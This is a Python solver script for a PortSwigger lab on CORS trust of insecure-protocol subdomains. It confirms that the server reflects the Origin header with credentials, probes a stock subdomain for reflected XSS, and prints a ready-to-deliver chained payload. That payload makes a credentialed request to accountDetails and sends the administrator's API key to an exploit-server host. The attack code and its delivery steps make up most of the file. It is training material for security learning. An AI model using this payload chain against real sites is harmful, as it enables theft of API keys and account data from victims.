# Lab 03 — CORS vulnerability with trusted insecure protocols
# PortSwigger: https://portswigger.net/web-security/cors/lab-breaking-https-attack
#
# Vulnerability: The server trusts ALL subdomains regardless of protocol
#                (both http:// and https:// are accepted for the same subdomain)
# Aim:           Steal the administrator's API key without a MITM position,
#                by chaining through a reflected XSS on a trusted subdomain
#
# Technique:
#   Normally this misconfiguration is exploited via MITM on a victim's plain
#   HTTP traffic to a trusted subdomain. The lab environment doesn't allow
#   MITM, so instead: find a subdomain that's both (a) trusted by the CORS
#   policy and (b) vulnerable to XSS — then host the CORS-exfiltration
#   script AS the XSS payload, satisfying the origin check "from the inside."
#
#   This script:
#     1. Confirms the insecure-protocol trust via `requests`
#     2. Attempts to auto-discover the "stock checker" subdomain and confirm
#        its productId parameter is reflected unescaped (XSS candidate)
#     3. Prints the full two-stage exploit for delivery via the exploit server
#
# Usage: python cors_lab03.py <url>

import sys
import re
import urllib3
from proxies import proxies
from cors_utils import banner, section, make_session, login, probe_origin, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — CORS: TRUSTED INSECURE PROTOCOLS")

    if len(sys.argv) != 2:
        print("  Usage: python cors_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: derive the bare domain and probe an HTTP subdomain origin ───
    print("\n  ── Step 1: probe with an HTTP (not HTTPS) subdomain Origin\n")

    domain = url.split("://", 1)[1].rstrip("/")
    http_subdomain_origin = f"http://subdomain.{domain}"

    result = probe_origin(session, f"{url}/accountDetails", http_subdomain_origin)

    if not (result["reflected"] and result["credentials"]):
        print("\n  ✘  HTTP subdomain origin not reflected with credentials.")
        print("     Inspect the response headers manually.")
        sys.exit(1)

    print("\n  ✔  Confirmed: subdomains are trusted over plain HTTP, not just HTTPS.\n")

    # ── Step 2: try to find the stock-checker subdomain and confirm XSS ─────
    print("  ── Step 2: locate the stock-checker subdomain and test for XSS\n")

    home = session.get(url)
    stock_links = re.findall(r'https?://(stock\.[a-z0-9.-]+)', home.text, re.IGNORECASE)

    if not stock_links:
        print("  ?  Could not auto-discover the stock subdomain from the home page.")
        print("     Browse a product page, click 'Check stock', and note the")
        print("     subdomain it opens (commonly 'stock.<lab-id>...').")
        stock_domain = f"stock.{domain}"
    else:
        stock_domain = stock_links[0]
        print(f"  ✔  Found candidate subdomain: {stock_domain}")

    xss_canary = "xsscanary123"
    stock_url = f"http://{stock_domain}/"
    r_xss_test = session.get(stock_url, params={"productId": xss_canary, "storeId": "1"})

    if xss_canary in r_xss_test.text:
        print(f"  ✔  '{xss_canary}' reflected raw in {stock_url} — XSS candidate confirmed\n")
    else:
        print(f"  ?  Could not confirm raw reflection on {stock_url} — proceed manually\n")

    # ── Step 3: print the full exploit chain ─────────────────────────────────
    section("Step 3: Exploit HTML/JS for the exploit server")

    cors_payload = (
        "<script>"
        "var req = new XMLHttpRequest();"
        "req.onload = function() {"
        f"  location = 'https://YOUR-EXPLOIT-SERVER.net/log?key=' + this.responseText;"
        "};"
        f"req.open('get','{url}/accountDetails',true);"
        "req.withCredentials = true;"
        "req.send();"
        "</script>"
    )

    exploit = f"""\
<script>
document.location =
  "http://{stock_domain}/?productId=" +
  encodeURIComponent(`{cors_payload}`) +
  "&storeId=1";
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)

    print("  ➜  Steps:")
    print("     1. Confirm the exact XSS injection point/context on the stock subdomain")
    print("        (adjust the payload above to match — angle brackets may need escaping)")
    print("     2. Update 'YOUR-EXPLOIT-SERVER.net' in the inner payload")
    print("     3. Paste the outer script into the exploit server Body field")
    print("     4. Store, test on yourself, then deliver to the victim")
    print("     5. Check the exploit server's access log for the leaked API key")
    print()
    print("  ℹ  The CORS policy itself wasn't directly exploitable without MITM —")
    print("     but trusting an ENTIRE subdomain meant that subdomain's own")
    print("     vulnerabilities (XSS) became a CORS bypass too.")
